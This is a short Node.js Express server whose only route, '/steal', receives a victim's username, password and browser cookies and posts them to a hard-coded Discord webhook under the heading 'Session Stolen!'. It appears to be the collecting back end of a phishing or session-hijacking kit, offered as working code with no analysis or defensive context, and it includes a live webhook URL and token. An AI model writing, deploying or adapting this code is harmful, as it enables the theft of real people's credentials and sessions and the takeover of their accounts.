const express = require('express');
const app = express();
const path = require('path');

// Your Discord Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1576100925183885395/1BSb5AqGSairin1gG3zfX1Rfks2jUO00uRnmy4MvIQIf9ywuwGntpFRYRjQ4FS4XOVAl";

app.use(express.json());
app.use(express.static('public'));

app.post('/steal', async (req, res) => {
    const { user, pass, cookies } = req.body;

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `🔓 **Session Stolen!**\n\n**User:** ${user}\n**Password:** ${pass}\n\n**Cookies:**\n\`\`\`${cookies}\`\`\``
            })
        });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }

    res.send('OK');
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});